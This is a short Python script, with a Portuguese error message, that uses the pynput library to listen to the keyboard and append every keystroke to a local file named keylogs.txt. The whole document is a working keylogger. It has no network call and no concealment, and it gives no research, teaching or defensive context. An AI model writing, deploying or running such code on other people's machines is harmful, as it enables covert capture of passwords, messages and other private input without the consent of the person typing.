from pynput.keyboard import Key, Listener

def on_press(key):
    try:
        with open("keylogs.txt", "a") as f:
            f.write(f"{key}\n")
    except Exception as e:
        print(f"Erro ao registrar tecla: {e}")

with Listener(on_press=on_press) as listener:
    listener.join()
